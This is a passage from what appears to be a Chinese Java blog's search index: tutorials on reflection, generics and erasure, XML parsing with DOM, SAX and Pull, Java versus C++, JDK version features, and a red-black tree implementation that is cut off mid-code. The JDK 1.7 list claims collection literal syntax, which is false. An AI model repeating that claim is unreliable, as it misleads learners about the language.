类型，还能通过传递参数来运行那个类里的那个方法，这就是反射。在Java中，Class类与java.lang.reflect类库一起对反射的概念提供了支持，该类库包含了Field、Method以及Constructor类（每个类都实现了Member接口）。我们知道对RTTI（运行时类型识别）来说，编译器在编译时打开和检查.class文件。而对于反射机制来说，.class文件在编译时是不可获取的，所以是在运行时打开和检查.class文件的。说了这么多，反射究竟有什么用呢？我们来看一下以下的例子： 1234567891011121314151617181920212223242526272829303132333435363738394041class A &#123; private int varA; public void myPublicA() &#123; System.out.println(\"I am public in A !\"); &#125;; private void myPrivateA() &#123; System.out.println(\"I am private in A !\"); &#125;; &#125; class B extends A &#123; public int varB; public void myPublicB()&#123;&#125;; &#125; public class Main &#123; public static void main(String[] args) throws Exception &#123; B b = new B(); // 子类方法 Method methods[] = b.getClass().getMethods(); for (Method method : methods) System.out.println(method); System.out.println(\"\"); // 子类变量 Field fields[] = b.getClass().getFields(); for (Field field : fields) System.out.println(field); // 基类 System.out.println(\"\\n\" + b.getClass().getSuperclass() + \"\\n\"); // 基类private方法也不能避免 Class superClass = b.getClass().getSuperclass(); methods = superClass.getDeclaredMethods(); for (Method method : methods) &#123; System.out.println(method); method.setAccessible(true); // 实例化A来调用private方法！ method.invoke(superClass.newInstance(), null); &#125; &#125; &#125; 在上面的例子中，我们用一个子类B，通过反射找到了他的数据域、与方法，还找到了他的基类A。更甚者，我们实例化了基类A，还调用了A里面的所有方法，甚至是private方法。从以上的例子相信大家都感受到了反射的威力了，运用使用class对象和反射提供的方法我们可以轻易的获取一个类的所有信息，包括被封装隐藏起来的信息，不仅如此我们还可以调用获取的信息来构造实例和调用方法。以上的展示只是反射的冰山一角，反射在动态代理和调用隐藏API等黑科技方面还发挥着重要的作用，博主在此不做深入探讨。 泛型常用特点，List&lt;String&gt;能否转为List&lt;Object&gt;泛型是Java SE5引入的一种新特性，泛型实现了参数化类型概念，使得我们的代码可以应用于更多类型，更多场景。在以往的J2SE中，没有泛型的情况下，通常是使用Object类型来进行多种类型数据的操作。这个时候操作最多的就是针对该Object进行数据的强制转换，而这种转换是基于开发者对该数据类型明确的情况下进行的（例如将Object型转换为String型）。如果类型不一致，编译器在编译过程中不会报错，但在运行时会出错。相比之下，使用泛型的好处在于，它在编译的时候进行类型安全检查，并且在运行时所有的转换都是强制的，隐式的，大大提高了代码的重用率。先来回答List能否转为List的问题，答案是不行的，因为String的list不是Object的list，String的list持有String类和其子类型，Object的list持有任何类型的Object，String的list在类型上不等价于Object的list。但List可以转为List&lt;? extends Object&gt;，Java代码如下： 123456789101112List&lt;String&gt; listString = new ArrayList&lt;&gt;(); // error : Type mismatch: cannot convert from List&lt;String&gt; to List&lt;Object&gt; List&lt;Object&gt; listObject = listString; // it's ok ! List&lt;? extends Object&gt; listExtendsObject = listString; // error : The method add(capture#1-of ? extends Object) in the type List&lt;capture#1-of ? extends Object&gt; is not applicable for the // arguments (String) listExtendsObject.add(\"string\"); // it's ok ! listExtendsObject.add(null); // it's ok ! Object object = listExtendsObject.get(0); 接下来讲讲泛型常用的特点，利用泛型我们可以实现以下内容： 带参数类型的类，泛型类类的参数类型写在类名的后面，多个参数类型用逗号分隔，定义完类型参数后，我们可以在定义位置之后的类的几乎任意地方（静态块，静态属性，静态方法除外）使用类型参数： 123class A&lt;T,S&gt; &#123; &#125; 带参数类型的方法，泛型方法除了可以定义泛型类，我们还可以把泛型应用于方法之上，要定义泛型方法只需把泛型参数列表置于返回值之前： 123456789// 泛型参数public &lt;T&gt; void f(T x) &#123; &#125;// 泛型返回值，根据返回值判断泛型public &lt;T&gt; T f() &#123;&#125; 使用泛型方法时通常不必指明参数类型，编译器会为我们找出具体类型，这称为类型参数推断。 关键字泛型还有两个重要的关键字extends和super，这两个关键字用于限制泛型的范围。extends把类型参数限制为某个类的子类： 123456789101112131415class A &#123;&#125; class B extends A &#123;&#125; class C &#123;&#125;; //代表了T为A或A的子类 class D &lt;T extends A&gt; &#123;&#125;; public class Main &#123; public static void main(String[] args) &#123; D&lt;A&gt; a; D&lt;B&gt; b; // no work! D&lt;C&gt; c; &#125; &#125; super与extends相反，把类型参数限制为某个类的父类。（此处博主研究不够深入，故对super关键字不够了解，在此不深入讨论） 擦除Java的泛型不是完美的泛型，Java的泛型为了考虑兼容性的问题，使用了擦除来实现。看一下下面的例子： 123456789101112131415161718192021222324class A &#123;&#125; class B extends A &#123;&#125; class C extends B &#123;&#125;; class D &lt;T&gt; &#123; T t; D(T t) &#123; this.t = t; &#125; public void f() &#123; System.out.println(Arrays.toString(this.getClass().getTypeParameters())); &#125; &#125;; public class Main &#123; public static void main(String[] args) &#123; D&lt;A&gt; a = new D&lt;A&gt;(new A()); D&lt;B&gt; b = new D&lt;B&gt;(new B()); D&lt;C&gt; c = new D&lt;C&gt;(new C()); a.f(); b.f(); c.f(); &#125; &#125; D中的f方法通过获取D的Class类来获取其类型信息，其打印的结果如下： 并不是我们传入的参数A、B、C，真是太失望了。这就是Java泛型擦除的特点，残酷的现实告诉我们在泛型代码的内部，我们无法获得任何有关泛型的参数类型信息，擦除会把类的类型信息给擦除到它的边界（如果有多个边界会擦除到第一个）。也就是说，对于上面例子中的T，我们只能把其当做Object类来处理（Object类为所有类的父类）。擦除使得所有与类型信息相关的操作都无法在泛型代码中进行，extends会稍微改善一点这种情况： 123456789101112131415161718class A &#123; public void fa() &#123;&#125;; &#125; class C &lt;T&gt; &#123; // 擦除到Object T t; public void f(Object a) &#123; if (a instanceof T) &#123;&#125; // error，不知道具体的类型信息 T var = new T(); // error，不知道该类型是否有默认构造函数 T[] array = new T[1]; // error t.fa(); // error &#125; &#125;; class D &lt;T extends A&gt; &#123; // 擦除到A T t; public void f(Object a) &#123; t.fa(); // this works &#125; &#125;; 解析XML的几种方式的原理与特点：DOM、SAX、PULLDOMDOM解析方法首先把xml文件读取到内存中，保存为节点树的形式，然后我们使用其API来读取树上的节点的信息。由于DOM解析xml文件时需要将其载入到内存，故xml文件较大时或内存较小的设备不适用该方法。使用DOM解析xml主要步骤如下： 使用DocumentBuilderFactory.newInstance方法获取DOM工厂实例 使用工厂的newDocumentBuilder方法获取builder 使用builder的parse方法解析xml获取生成的Document对象 使用Document的getDocumentElement方法获取根节点 调用根节点的getChildNodes方法遍历子节点 SAX与DOM不同，SAX全称为Simple API for XML ，是基于事件驱动的解析手段。对于SAX而言分析xml能够立即开始，而不用等待所有的数据被处理。而且，由于SAX只是在读取数据时检查数据，因此不需要将数据存储在内存中。一般来说SAX解析比DOM解析快许多，但由于SAX解析xml文件是一次性处理，因此相对DOM而言没有那么灵活方便。使用SAX解析主要步骤如下： 调用SAXParserFactory.newInstance获取SAX工厂实例 调用工厂的newSAXParser方法获取解析器 调用解析器的getXMLReader获取事件源reader 调用setContentHandler方法为事件源reader设置处理器 调用parse方法开始解析数据 PULL与SAX类似，Pull也是一种基于事件驱动的xml解析器。与SAX不同在于Pull让我们手动控制解析进度，通过返回eventType来让我们自行处理xml的节点，而不是调用回调函数，eventType有如下几种： 读取到xml的声明返回 START_DOCUMENT 读取到xml的结束返回 END_DOCUMENT 读取到xml的开始标签返回 START_TAG 读取到xml的结束标签返回 END_TAG 读取到xml的文本返回 TEXT 使用Pull解析的主要步骤如下： 使用XmlPullParserFactory.newInstance方法获取Pull工厂 调用工厂newPullParser方法返回解析器 使用解析器setInput方法设置解析文件 调用next方法解析下一行，调用getEventType方法获取当前的解析情况 3种解析方法的代码如下：DOM与SAX： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283public static void main(String[] args) throws Exception &#123; // 桌面的xml文件,文件内容如下 // &lt;all name=\"testData\"&gt; // &lt;item first=\"1\" second=\"A\" third=\"一\"/&gt; // &lt;item first=\"2\" second=\"B\" third=\"二\"/&gt; // &lt;item first=\"3\" second=\"C\" third=\"三\"/&gt; // &lt;item first=\"4\" second=\"D\" third=\"四\"/&gt; // &lt;item first=\"5\" second=\"E\" third=\"五\"/&gt; // &lt;/all&gt; File file = new File(\"C:/Users/Administrator/Desktop/test.xml\"); // 文件流 FileInputStream fis = new FileInputStream(file); &#123; // DOM解析xml System.out.println(\"DOM:\"); // 获取DOM工厂实例 DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); // 生成builder DocumentBuilder builder = factory.newDocumentBuilder(); // 解析文件 Document document = builder.parse(file); // 获取根节点 Element element = document.getDocumentElement(); System.out.println(element.getTagName() + \" \" + element.getAttribute(\"name\")); // 获取子节点列表 NodeList nodeList = element.getChildNodes(); for (int i = 0; i &lt; nodeList.getLength(); i++) &#123; Node node = nodeList.item(i); // 节点类型为元素节点 if (node.getNodeType() == Node.ELEMENT_NODE) &#123; Element child = (Element) node; // 输出标签名和元素内容 System.out.println(child.getTagName() + \" \" + child.getAttribute(\"first\") + \" \" + child.getAttribute(\"second\") + \" \" + child.getAttribute(\"third\")); &#125; &#125; &#125; System.out.println(\"\"); // empty line &#123; // SAX解析xml System.out.println(\"SAX:\"); // 获取SAX工厂实例 SAXParserFactory factory = SAXParserFactory.newInstance(); // 获取SAX解析器 SAXParser parser = factory.newSAXParser(); // 获取reader XMLReader reader = parser.getXMLReader(); // 设置解析源和处理器 reader.setContentHandler(new MySAXHandler()); // 在parse之前设置 reader.parse(new InputSource(fis)); &#125; &#125; // 自定义SAX处理器 static class MySAXHandler extends DefaultHandler &#123; @Override public void startDocument() throws SAXException &#123; // 解析文档开始时调用 super.startDocument(); &#125; @Override public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; // 解析元素开始时调用 // 打印元素名 System.out.print(qName); // 打印元素属性 for (int i = 0; i &lt; attributes.getLength(); i++) System.out.print(\" \" + attributes.getValue(i)); System.out.println(\"\"); super.startElement(uri, localName, qName, attributes); &#125; @Override public void endElement(String uri, String localName, String qName) throws SAXException &#123; // 解析元素结束时调用 super.endElement(uri, localName, qName); &#125; @Override public void endDocument() throws SAXException &#123; // 解析文档结束时调用 super.endDocument(); &#125; &#125; Pull（此为Android解析中国天气网省份信息xml文件的例子）： 12345678910111213141516171819202122232425262728293031XmlPullParserFactory factory = XmlPullParserFactory .newInstance(); XmlPullParser xmlPullParser = factory.newPullParser(); // use gb2312 encode ByteArrayInputStream is = new ByteArrayInputStream( response.getBytes(\"GB2312\")); xmlPullParser.setInput(is, \"GB2312\"); int eventType = xmlPullParser.getEventType(); String provinceName = \"\"; String provinceCode = \"\"; while (eventType != XmlPullParser.END_DOCUMENT) &#123; String nodeName = xmlPullParser.getName(); switch (eventType) &#123; // start parse node case XmlPullParser.START_TAG: if (\"city\".equals(nodeName)) &#123; provinceName = xmlPullParser.getAttributeValue(\"\", \"quName\"); provinceCode = xmlPullParser.getAttributeValue(\"\", \"pyName\"); Province province = new Province(); province.setProvinceName(provinceName); province.setProvinceCode(provinceCode); coolWeatherDB.saveProvince(province); &#125; break; default: break; &#125; eventType = xmlPullParser.next(); &#125; 本人对三种解析方法的总结如下： 需要解析小的xml文件，需要重复解析xml文件或需要对xml文件中的节点进行删除修改排序等操作：使用DOM 需要解析较大的xml文件，只需要解析一次的xml文件：使用SAX或Pull 只需要手动解析部分的xml文件：使用Pull Java与C++对比Java是由C++发展而来的，保留了C++的大部分内容，其编程方式类似于C++，但是摒弃了C++的诸多不合理之处，Java是纯面向对象的编程语言。Java和C++的区别主要如下： 都是类与对象在Java中，一切的组件都是类与对象，没有单独的函数、方法与全局变量。C++中由于可以使用C代码，故C++中类对象与单独的函数方法共存。 多重继承在C++中类可以多重继承，但这有可能会引起菱形问题。而在Java中类不允许多重继承，一个类只能继承一个基类，但可以实现多个接口，避免了菱形问题的产生。 操作符重载C++允许重载操作符，而Java不允许。 数据类型大小在C++中，不同的平台上，编译器对基本数据类型分别分配不同的字节数，导致了代码数据的不可移植性。在Java中，采用基于IEEE标准的数据类型，无论任何硬件平台上对数据类型的位数分配总是固定的。（然而boolean基本类型要看JVM的实现） 内存管理C++需要程序员显式地声明和释放内存。Java中有垃圾回收器，会在程序内存不足或空闲之时在后台自行回收不再使用的内存，不需要程序员管理。 指针指针是C++中最灵活也最容易出错的数据类型。Java中为了简单安全去掉了指针类型。 类型转换C++中，会出现数据类型的隐含转换,涉及到自动强制类型转换。Java中系统要对对象的处理进行严格的相容性检查，防止不安全的转换。如果需要，必须由程序显式进行强制类型转换。（如int类型不能直接转换为boolean类型） 方法绑定C++默认的方法绑定为静态绑定，如果要使用动态绑定实现多态需要用到关键字virtual。Java默认的方法绑定为动态绑定，只有final方法和static方法为静态绑定。 目前博主就想到这么多，还有的以后再补充。 Java1.5、1.7与1.8新特性JDK1.5 自动装箱与拆箱：基本类型与包装类型自动互换 枚举类型的引入 静态导入：import static，可直接使用静态变量与方法 可变参数类型 泛型 for-each循环 JDK1.7 switch允许传入字符串 泛型实例化类型自动推断：List tempList = new ArrayList&lt;&gt;() 对集合的支持，创建List / Set / Map 时写法更简单了，如：List&lt; String&gt; list = [“item”]，String item = list[0]，Set&lt; String &gt; set = {“item”}等 允许在数字中使用下划线 二进制符号加入，可用作二进制字符前加上 0b 来创建一个二进制类型：int binary = 0b1001_1001 一个catch里捕捉多个异常类型，‘|’分隔 JDK1.8 允许为接口添加默认方法，又称为拓展方法，使用关键字default实现 Lambda 表达式 Date API 多重注解","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"算法导论之红黑树的学习","slug":"算法导论之红黑树的学习","date":"2016-03-22T02:06:46.000Z","updated":"2020-05-11T07:23:44.878Z","comments":true,"path":"2016/03/22/算法导论之红黑树的学习/","link":"","permalink":"https://superxlcr.github.io/2016/03/22/算法导论之红黑树的学习/","excerpt":"","text":"最近学习了二叉搜索树中的红黑树，感觉收获颇丰，在此写一篇文章小结一下学到的知识，顺便手写一下Java代码。 引言先来讲讲什么是二叉搜索树，二叉搜索树有如下特点：他是以一颗二叉树（最多有两个子结点）来组织的，对于树中的某个节点，其左子树的所有元素均小于该节点，其右子树的元素均大于该节点。我们知道一颗有N个节点的二叉树的高度至少为lgN，然后在树上的操作都与其高度有关，因此限制树的高度就显得非常有必要。当一个二叉搜索树的高度是lgN时，在该树上的插入删除搜索等操作均为O（lgN）的时间复杂度，但当二叉搜索树不小心插入成了链表，高度为N的时候，在树上的操作就变为O（N）了。因此我们有许多种平衡二叉树通过特定的方法来限制树的高度，红黑树就是其中的一种。红黑树（Red Black Tree） 是一种自平衡二叉查找树，是在计算机科学中用到的一种数据结构，它在每个节点上增加了一个存储位来表示节点的颜色，可以为红色或黑色。通过对任何一条从根到叶子的简单路径上各个节点的颜色进行约束，红黑树确保没有一条路径会比其他路径长出2倍，因此是近似于平衡的。 红黑树的性质一颗红黑树是满足以下红黑性质的二叉搜索树： 每个节点是红色或黑色 根是黑色 叶节点（null）是黑色的 红色的节点的两个子结点均为黑色 对于每个节点，从该节点到其所有后代的简单路径上，均包含相同数目的黑色节点（我们把到叶节点的黑色节点数称为黑高） Java中树的节点类如下： 1234567891011121314151617181920212223242526272829303132// 颜色枚举 enum RBColor &#123; RED, BLACK; &#125; // 树节点类 class RBTreeNode &#123; RBTreeNode p = nullNode; // 父节点 RBTreeNode left = nullNode; // 左子节点 RBTreeNode right = nullNode; // 右子节点 int val; // 值 RBColor color; // 颜色 public RBTreeNode() &#123;&#125;; RBTreeNode(int val) &#123; this.val = val; &#125; @Override public String toString() &#123; return \" (\" + val + \" \" + color + \") \"; &#125; // 用于表示空叶节点的静态变量 public static RBTreeNode nullNode = new RBTreeNode() &#123; &#123; color = RBColor.BLACK; // 叶结点为黑色 &#125; @Override public String toString() &#123; return \" (null \" + color + \") \"; &#125; &#125;; &#125; 旋转红黑树的关键操作在于其插入和删除操作，但在讲解这两步关键操作之前，我们得定义一些辅助方法来让我们更好的完成任务，该辅助方法就是树的旋转，示意图如下： 旋转由两种，分别是左旋和右旋，相信上图已经表示的非常明确，这里就不再细说，值得注意的是：在旋转操作中只有指针的改变，其他属性都保持不变。对旋转前后的树使用中序遍历将得到相同的结果。下面是旋转的Java代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/** * 左旋操作 * @param root 根结点引用 * @param node 旋转的节点 * @return 根节点 */ public static RBTreeNode leftRotate(RBTreeNode root, RBTreeNode node) &#123; if (node.right == RBTreeNode.nullNode) return root; // 左旋需要拥有右节点 RBTreeNode right = node.right; // 旋转节点的右子树变为右节点的左子树 node.right = right.left; if (node.right != RBTreeNode.nullNode) node.right.p = node; // 用右节点代替旋转节点位置 if (node.p != RBTreeNode.nullNode) &#123; right.p = node.p; if (node.p.left == node) node.p.left = right; else node.p.right = right; &#125; else &#123; root = right; // 没有父节点的节点为根结点 root.p = RBTreeNode.nullNode; &#125; // 右节点的左子树变为旋转节点 right.left = node; node.p = right; return root; &#125; /** * 右旋操作 * @param root 根结点引用 * @param node 旋转节点 * @return 根节点 */ public static RBTreeNode rightRotate(RBTreeNode root, RBTreeNode node) &#123; if (node.left == RBTreeNode.nullNode) return root; // 右旋需要有左节点 RBTreeNode left = node.left; // 旋转节点的左子树变为左节点的右子树 node.left = left.right; if (node.left != RBTreeNode.nullNode) node.left.p = node; // 用左节点代替旋转节点 if (node.p != RBTreeNode.nullNode) &#123; left.p = node.p; if (node.p.left == node) node.p.left = left; else node.p.right = left; &#125; else &#123; root = left; root.p = RBTreeNode.nullNode; &#125; // 左节点的右子树变为旋转节点 left.right = node; node.p = left; return root; &#125; 插入终于来到红黑树的第一个关键步骤了：插入操作。对与插入操作我们利用如下思想解决：我们先把红黑树看成一个普通的二叉搜索树，对其进行插入操作，插入完成后，我们把新加入的节点染成红色，此时红黑树的红黑性质被破坏，然后再通过特定的方法来维护红黑树的性质。插入的Java代码如下： 12345678910111213141516171819202122232425/** * 红黑树插入操作 * @param root 根结点引用 * @param insertNode 要插入的新节点 * @return 根节点 */ public static RBTreeNode rbInsert(RBTreeNode root, RBTreeNode insertNode) &#123; RBTreeNode position = root, parent = RBTreeNode.nullNode; // position为插入位置，parent为该位置的父节点 while (position != RBTreeNode.nullNode) &#123; parent = position; if (insertNode.val &lt; position.val) // 比该节点元素小的节点应该插入其左子树 position = position.left; else // 比该节点元素大的节点应该插入其右子树 position = position.right; &#125; insertNode.p = parent; if (parent == RBTreeNode.nullNode) // 没有父节点的节点为根结点 root = insertNode; else if (insertNode.val &lt; parent.val) // 插入为左节点 parent.left = insertNode; else // 插入为右节点 parent.right = insertNode; insertNode.color = RBColor.RED; // 把新插入的节点染成红色 return rbInsertFixup(root, insertNode); // 修复插入时红黑树性质 &#125; 好，终于来到重点了，红黑树的插入操作前半部分与一般二叉搜索树别无二致，区别在于最后把新加入的节点染成红色和恢复红黑树性质的部分。我们先来思考一下往红黑树插入一个红节点会破坏红黑树的什么性质？首先性质1、3、5是不会受影响的，那么当我们插入的节点是红黑树的根结点时会影响性质2，根节点变成了红色，此时我们把根节点染成黑色即可。当我们插入节点的父节点是红色时会影响性质4，红色节点有一个为红色的子结点。对于以上这些影响我们分为3种情况来处理： 关键词：叔节点 下面我们假设插入的节点为z（红色），其父节点为x（红色，为祖父节点的左节点，右节点情况镜像处理即可），其叔节点为y（未知），祖父节点为w（黑色） 情况1：插入节点z的叔节点y为红色此时的情况如图所示（下图省略了部分不关键的子树）： 此时的处理方法很简单，我们只需把祖父节点的黑色“扒”下来放到父节点X和叔节点Y即可，此时对于节点Z就保持了红黑树的性质4，然而进行了此操作后我们还需要对祖父节点W进行继续遍历，因为此时祖父节点有可能违反了红黑树的性质。当我们遍历的祖父节点为根结点时，把根结点变为黑色即可。 情况2：插入节点z的叔节点y是黑色的，且z是一个右孩子情况3：插入节点z的叔节点y是黑色的，且z是一个左孩子这两种情况可以放一起讨论，因为我们会把情况2转化为情况3，示意图如下： 左上角为情况2，此时叔节点w为黑色，且插入节点z为父节点x的右孩子，此时我们对父节点x进行一次左旋，然后交换x和z的引用，即可转换为右上角的情况3.右上角为情况3，此时叔节点w为黑色，且插入节点z为父节点x的左孩子，此时我们进行如下操作即可恢复红黑树的性质： 交换父节点x和祖父节点w的颜色 对祖父节点w进行右旋 上面的操作既修正了对性质4的违反，也没有引起对其他红黑树性质的违反，因此我们此时可以结束对红黑树的性质修复工作。下面给出红黑树插入时性质修复的Java代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * 修復插入時违反的红黑树性质 * @param root 根节点引用 * @param node 修复节点 * @return 根节点 */ public static RBTreeNode rbInsertFixup(RBTreeNode root, RBTreeNode node) &#123; // 修复节点不是根节点且为红色时 RBTreeNode parent = node.p, grandParent, parentBorther; while(parent != RBTreeNode.nullNode &amp;&amp; parent.color == RBColor.RED) &#123; grandParent = parent.p; if (grandParent.left == parent) &#123; // 父节点为左节点 parentBorther = grandParent.right; // 叔节点为右节点 if (parentBorther != RBTreeNode.nullNode &amp;&amp; parentBorther.color == RBColor.RED) &#123; // case 1 grandParent.color = RBColor.RED; // 祖父节点改为红色 parent.color = RBColor.BLACK; // 父节点和叔节点改为黑色 parentBorther.color = RBColor.BLACK; node = grandParent; // 对祖父节点继续遍历 &#125; else &#123; if (parent.right == node) &#123; // case 2 root = leftRotate(root, parent); // 对父节点左旋 // 交换node和parent的引用 RBTreeNode temp = node; node = parent; parent = temp; &#125; // case 3 grandParent.color = RBColor.RED; // 祖父染成红色 parent.color = RBColor.BLACK; // 父节点染成黑色 root = rightRotate(root, grandParent); // 对祖父右旋 node = root; // 把节点置为根节点退出修复 &#125; &#125; else &#123; // 父节点为右节点，镜像处理 parentBorther = grandParent.left; if (parentBorther != RBTreeNode.nullNode &amp;&amp; parentBorther.color == RBColor.RED) &#123; // case 1 grandParent.color = RBColor.RED; parent.color = RBColor.BLACK; parentBorther.color = RBColor.BLACK; node = grandParent; &#125; else &#123; if (parent.left == node) &#123; // case 2 root = rightRotate(root, parent); RBTreeNode temp = node; node = parent; parent = temp; &#125; // case 3 grandParent.color = RBColor.RED; parent.color = RBColor.BLACK; root = leftRotate(root, grandParent); node = root; &#125; &#125; parent = node.p; &#125; // 根节点染为黑色 root.color = RBColor.BLACK; return root; &#125; 删除讲完插入，我们来讲讲删除操作。与插入类似，再删除前我们先把红黑树当成是一颗普通的二叉搜索树来处理删除节点的操作。但在把节点删除过后，由于删除节点会带走一种颜色，因此我们需要记录下被删除的颜色和删除颜色的位置，最后我们再考虑如何修复树的红黑性质。二叉搜索树删除节点分为三种情况，这里简单提一下： 删除节点没有子节点：直接把删除节点的位置置空即可 删除节点有一个子节点：用该子节点顶替删除节点的位置 删除节点有两个子节点：这是比较复杂的情况，此时我们要从删除节点的两边子树中寻找一个节点来顶替其位置，我们可以找右子树的最小节点或左子树的最大节点，本文给出的代码为寻找右子树的最小节点。同时在代码中我们把删除节点的颜色赋给顶替节点，从而使实际删除颜色的节点为顶替节点。 Java代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/** * 红黑树删除操作 * @param root 根节点引用 * @param deleteNode 要删除的节点 * @return 根节点 */ public static RBTreeNode rbDelete(RBTreeNode root, RBTreeNode deleteNode) &#123; RBTreeNode replaceNode, fixNode = RBTreeNode.nullNode; // 顶替删除节点的代替节点、需要修复颜色的节点位置 RBTreeNode fixNodeParent = deleteNode.p; RBColor deleteColor = deleteNode.color; // 记录被删除节点的颜色 if (deleteNode.left == RBTreeNode.nullNode &amp;&amp; deleteNode.right == RBTreeNode.nullNode) // 删除节点没有任何子结点 replaceNode = RBTreeNode.nullNode; else if (deleteNode.right == RBTreeNode.nullNode) &#123; // 处理只有左子节点的情况 replaceNode = deleteNode.left; fixNode = replaceNode; &#125; else if (deleteNode.left == RBTreeNode.nullNode) &#123; //处理只有右子节点的情况 replaceNode = deleteNode.right; fixNode = replaceNode; &#125; else &#123; // 处理有两个子节点的情况 replaceNode = deleteNode.right; while (replaceNode.left != RBTreeNode.nullNode) // 找到右子树的最小节点 replaceNode = replaceNode.left; fixNode = replaceNode.right; // 修复节点位置变为原顶替节点位置 if (replaceNode.p == deleteNode) &#123; // 特殊情况，右子树没有左节点 if (fixNode != RBTreeNode.nullNode) // 修复节点不为空 fixNode.p = replaceNode; fixNodeParent = replaceNode; &#125; else &#123; replaceNode.p.left = fixNode; // 修复节点顶替该节点的位置 if (fixNode != RBTreeNode.nullNode) // 修复节点不为空 fixNode.p = replaceNode.p; fixNodeParent = replaceNode.p; replaceNode.right = deleteNode.right; &#125; // 用删除节点的颜色代替顶替节点的颜色，使得被删除颜色的节点实际变为顶替节点 deleteColor = replaceNode.color; replaceNode.color = deleteNode.color; replaceNode.left = deleteNode.left; &#125; if (replaceNode != RBTreeNode.nullNode) // 存在顶替节点 replaceNode.p = deleteNode.p; if (deleteNode.p == RBTreeNode.nullNode) // 删除节点的父节点为空，是根节点 root = replaceNode; else &#123; // 删除节点不是根节点 if (deleteNode.p.left == deleteNode) deleteNode.p.left = replaceNode; else deleteNode.p.right = replaceNode; &#125; if (deleteColor == RBColor.BLACK) // 如果删除的颜色是黑色则需要进行修复 root = rbDeleteFixup(root, fixNode, fixNodeParent); return root; &#125; 接下来我们来考虑一下一上的删除操作会影响红黑树的什么性质。首先，如果删除的节点颜色为红色，则不会影响任何红黑性质。但如果删除的颜色是黑色，则可能影响性质2（根节点是黑色的），也可能影响性质4（红色的节点的两个子结点均为黑色），也可能影响性质5（对于每个节点，从该节点到其所有后代的简单路径上，均包含相同数目的黑色节点）。那么当删除的节点颜色为黑色时，对于如何修复删除后的红黑性质，我们采用以下思考方式：我们假设修复位置的节点具有两种颜色，该节点原来的颜色，以及我们被删除的黑色。那么： 如果该节点原来为红色，那么我们被删除的黑色可以直接覆盖其颜色不影响任何红黑性质 如果该节点是黑色同时他也是根节点，那么我们可以简单的“消除”掉节点上面的一层黑色 如果该节点是黑色，但不是根节点，我们只能通过旋转和重新着色的方法转换修复的位置或退出循环 以下把修复删除红黑性质的工作分为4中情况，此处假设修复位置节点为A（黑色，此处假设为父节点的左节点，右节点请镜像处理），其父节点为B，兄弟节点为C，兄弟节点的左子节点为D，兄弟节点的右子节点为E。 关键词：兄弟节点 情况1：A的兄弟节点为红色 如上图所示，此时我们先交换父节点B和兄弟节点C的颜色，然后对父节点B进行左旋，以上操作并不会影响红黑树性质，而我们也把情况1转化为了别的情况。 情况2：A的兄弟节点为黑色，其子节点均为黑色（下图灰色代表未知颜色） 此时的处理方法很简单，因为A节点和其兄弟节点C均为黑色，且C的子节点也均为黑色，因此我们可以把A节点和C节点的黑色上移到父节点B上，再把修复位置换为父节点B，针对父节点B继续进行修复。（如果父节点B是红色或根节点就可以停止修复了～） 情况3：A的兄弟节点为黑色，兄弟节点的左子节点为红色，右子节点为黑色 此时我们首先交换兄弟节点C与其左子红色节点D的颜色，然后对兄弟节点C进行右旋，把情况3转化为情况4继续处理。 情况4：A的兄弟节点为黑色，兄弟节点的右子节点为红色 此时我们进行如下变换操作： 把父节点B和兄弟节点的右子节点E染成黑色，兄弟节点C染成父节点颜色 对父节点B进行左旋 以上操作在没有破坏红黑树性质的情况下，消除了节点A的一重黑色，因此至此修复过程可以结束了。删除时修复过程的Java代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586/** * 修复删除时破坏的红黑树性质 * @param root 根引用 * @param fixNode 修复位置 * @param parent 修复位置的父节点（修复位置为叶结点时使用） * @return 根 */ public static RBTreeNode rbDeleteFixup(RBTreeNode root, RBTreeNode fixNode, RBTreeNode parent) &#123; RBTreeNode brother; while (root != fixNode &amp;&amp; fixNode.color == RBColor.BLACK) &#123; parent = fixNode.p == null ? parent : fixNode.p; // 处理fixNode为nullNode情况 if (fixNode == parent.left) &#123; // 顶替位置在父节点左边 brother = parent.right; if (brother.color == RBColor.RED) &#123; // case 1 // 交换父节点和兄弟节点的颜色 RBColor temp = brother.color; brother.color = parent.color; parent.color = temp; // 父节点进行左旋 root = leftRotate(root, parent); &#125; else if (brother == RBTreeNode.nullNode) &#123; // case 2 // 兄弟节点为空，即为黑色，只需继续遍历父节点即可 fixNode = parent; &#125; else if (brother.left.color == RBColor.BLACK &amp;&amp; brother.right.color == RBColor.BLACK) &#123; // case 2 brother.color = RBColor.RED; fixNode = parent; // 继续遍历父节点 &#125; else &#123; // case 3 and case 4 if (brother.left.color == RBColor.RED &amp;&amp; brother.right.color == RBColor.BLACK) &#123; // case 3 // 兄弟节点染成红色，左子节点染成黑色 brother.color = RBColor.RED; brother.left.color = RBColor.BLACK; // 兄弟节点右旋 root = rightRotate(root, brother); brother = brother.p; &#125; // case 4 // 变色 brother.color = parent.color; parent.color = RBColor.BLACK; brother.right.color = RBColor.BLACK; // 父节点左旋 root = leftRotate(root, parent); break; &#125; &#125; else &#123; brother = parent.left; if (brother.color == RBColor.RED) &#123; // case 1 // 交换父节点和兄弟节点的颜色 RBColor temp = brother.color; brother.color = parent.color; parent.color = temp; // 父节点进行右旋 root = rightRotate(root, parent); &#125; else if (brother == RBTreeNode.nullNode) &#123; // case 2 // 兄弟节点为空，即为黑色，只需继续遍历父节点即可 fixNode = parent; &#125; else if (brother.left.color == RBColor.BLACK &amp;&amp; brother.right.color == RBColor.BLACK) &#123; // case 2 brother.color = RBColor.RED; fixNode = parent; // 继续遍历父节点 &#125; else &#123; // case 3 and case 4 if (brother.right.color == RBColor.RED &amp;&amp; brother.left.color == RBColor.BLACK) &#123; // case 3 // 兄弟节点染成红色，左子节点染成黑色 brother.color = RBColor.RED; brother.right.color = RBColor.BLACK; // 兄弟节点右旋 root = leftRotate(root, brother); brother = 